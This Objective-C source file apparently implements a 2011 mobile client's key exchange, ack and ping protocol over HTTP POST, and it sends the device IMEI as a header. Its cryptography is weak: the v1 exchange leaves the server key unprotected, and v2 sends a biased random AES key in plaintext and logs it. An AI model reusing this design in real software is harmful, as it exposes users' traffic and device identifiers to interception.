//
//  UnstructuredManager.m
//  PhoenixComponent
//
//  Created by Pichaya Srifar on 7/18/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import "UnstructuredManager.h"
#import "CSMDeviceManager.h"
#import "ASIHTTPRequest.h"

/*
static NSString *TAG =@"UnstructuredManager";
static BOOL DEBUG = YES;
static int HTTP_TIME_OUT = (1*60*1000);
static int THREAD_TIME_OUT = (1*60*1000);
*/

@interface UnstructuredManager (private)
+ (void) setHttpRequestHeaders: (ASIHTTPRequest *) aASIHttpRequest;
@end


@implementation UnstructuredManager

@synthesize URL;
@synthesize HTTPErrorMsg;

- (UnstructuredManager *) init {
	self = [super init];
	if(self) {
		[self setURL:[NSURL URLWithString:@""]];
	}
	return self;
}

- (UnstructuredManager *)initWithURL:(NSURL *)url {
	self = [super init];
	if (self) {
		[self setURL:url];
	}
	return self;
}

// Initial key exchange protocol no security measure to protect server public key
- (KeyExchangeResponse *)doKeyExchangev1:(unsigned short)code withEncodingType:(unsigned short)encodeType {
	NSData *postData = [UnstructProtParser parseKeyExchangeRequest:code withEncodingType:encodeType];
	
	DLog(@"postData %@", postData);
	
	ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[self URL]];
	[request setRequestMethod:@"POST"];
	[request appendPostData:postData];
	[request setTimeOutSeconds:60];
	[UnstructuredManager setHttpRequestHeaders:request];
	
	[request startSynchronous];
	NSData *responseData = [request responseData];
	DLog(@"responseData %@", responseData);
	
	KeyExchangeResponse *result = nil;
	NSError *error = [request error];
	DLog(@"responseData length = %d, error domain %@", [responseData length], [error domain]);
	
	if (error || [responseData length] == 0) {
		DLog(@"doKeyExchange error %@", error);
		result = [[KeyExchangeResponse alloc] init];
		[result setIsOK:NO];
		return [result autorelease];
	}
	
	result = [UnstructProtParser parseKeyExchangeResponse:responseData];
	
	return result;
}


// Use random AES key to server and then decrypt the response data with partial key plus tail
- (KeyExchangeResponse *)doKeyExchangev2:(unsigned short)code withEncodingType:(unsigned short)encodeType {
	NSData *postData = [UnstructProtParser parseKeyExchangeRequest:code withEncodingType:encodeType];
		
	DLog(@"postData %@", postData);

	ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[self URL]];
	[request setRequestMethod:@"POST"];
	[request appendPostData:postData];
	[request setTimeOutSeconds:60];
	[UnstructuredManager setHttpRequestHeaders:request];

	NSMutableData *keyData = [NSMutableData data];
	for (NSInteger i = 0; i < 16; i++) {
		unsigned char byte = (char)abs((arc4random() % 255));
		[keyData appendBytes:&byte length:sizeof(unsigned char)];
	}
	
	uint16_t lengthKey = [keyData length];
	lengthKey = htons(lengthKey);
	[request appendPostData:[NSData dataWithBytes:&lengthKey length:sizeof(uint16_t)]];
	[request appendPostData:keyData];
	
	DLog (@"keyData = %@", keyData);

	[request startSynchronous];
	NSData *responseData = [request responseData];
	DLog(@"responseData %@", responseData);

	KeyExchangeResponse *result = nil;
	NSError *error = [request error];
	DLog(@"responseData length = %d, error domain %@", [responseData length], [error domain]);

	if (error || [responseData length] == 0) {
		DLog(@"doKeyExchange error %@", error);
		result = [[KeyExchangeResponse alloc] init];
		[result setIsOK:NO];
		return [result autorelease];
	}
	
	result = [UnstructProtParser parseKeyExchangeResponse:responseData withKey:keyData];

	return result;
}

- (AckSecResponse *)doAckSecure:(unsigned short)code withSessionId:(unsigned int)sessionId {
	NSData *postData = [UnstructProtParser parseAckSecureRequest:code withSessionId:sessionId];
	
	DLog(@"postData = %@", postData);

	ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[self URL]];
	
	[request setRequestMethod:@"POST"];
	[request appendPostData:postData];
	[request setTimeOutSeconds:60];
	[UnstructuredManager setHttpRequestHeaders:request];
	
	[request startSynchronous];
	NSData *responseData = [request responseData];
	DLog(@"responseData = %@", responseData);
	AckSecResponse *result = nil;
	if ([request error] || [responseData length] == 0) {
		result = [[AckSecResponse alloc] init];
		[result setIsOK:NO];
		[result autorelease];
	} else {
		result = [UnstructProtParser parseAckSecureResponse:responseData];
	}
	return result;
}

- (AckResponse *)doAck:(unsigned short)code withSessionId:(unsigned int)sessionId withDeviceId:(NSString *)deviceId {
	NSData *postData = [UnstructProtParser parseAckRequest:code withSessionId:sessionId withDeviceId:deviceId];
	
	DLog(@"doAck postData = %@", postData);
	
	ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[self URL]];
	
	[request setRequestMethod:@"POST"];
	[request appendPostData:postData];
	[request setTimeOutSeconds:60];
	[UnstructuredManager setHttpRequestHeaders:request];
	
	[request startSynchronous];
	NSData *responseData = [request responseData];
	DLog(@"reponseData = %@", responseData);
	AckResponse *result = nil;
	if ([request error] || [responseData length] == 0) {
		// Cannot rely on only error.... since some situation no error but data length is 0
		// which cause crash in parsing the data
		result = [[AckResponse alloc] init];
		[result setIsOK:NO];
		[result autorelease];
	} else {
		result = [UnstructProtParser parseAckResponse:responseData];
	}
	DLog(@"result = %@", result);
	return result;
}

- (PingResponse *)doPing:(unsigned short)code {
	NSData *postData = [UnstructProtParser parsePingRequest:code];
	
	DLog(@"postData = %@", postData);
	
	ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[self URL]];
	
	[request setRequestMethod:@"POST"];
	[request appendPostData:postData];
	[request setTimeOutSeconds:60];
	[UnstructuredManager setHttpRequestHeaders:request];
	
	[request startSynchronous];
	NSData *responseData = [request responseData];
	DLog(@"responseData = %@", responseData);
	PingResponse *result = nil;
	if ([request error] || [responseData length] == 0) {
		result = [[PingResponse alloc] init];
		[result setIsOK:NO];
		[result autorelease];
	} else {
		result = [UnstructProtParser parsePingResponse:responseData];
	}
	return result;
}

+ (void) setHttpRequestHeaders: (ASIHTTPRequest *) aASIHttpRequest {
	DLog (@"[UnstructuredManager] HTTP request headers = %@", [aASIHttpRequest requestHeaders]);
	CSMDeviceManager *csmDeviceManager = [CSMDeviceManager sharedCSMDeviceManager];
	[aASIHttpRequest addRequestHeader:@"owner" value:[csmDeviceManager mIMEI]];
	[aASIHttpRequest buildRequestHeaders];
	DLog (@"[UnstructuredManager] HTTP request headers = %@", [aASIHttpRequest requestHeaders]);
}

- (void) dealloc {
	[URL release];
	[HTTPErrorMsg release];
	[super dealloc];
}

@end
